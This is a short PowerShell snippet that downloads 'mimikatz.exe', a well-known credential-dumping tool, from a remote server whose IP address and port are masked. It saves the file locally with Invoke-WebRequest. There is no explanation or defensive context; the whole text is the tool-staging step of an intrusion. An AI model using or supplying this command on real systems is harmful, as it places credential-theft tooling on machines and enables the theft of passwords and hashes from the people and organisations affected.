$source = 'http://xxx.xxx.xxx.xxx:xxxx/mimikatz.exe'
$destination = 'mimikatz.exe'
Invoke-WebRequest -Uri $source -OutFile $destination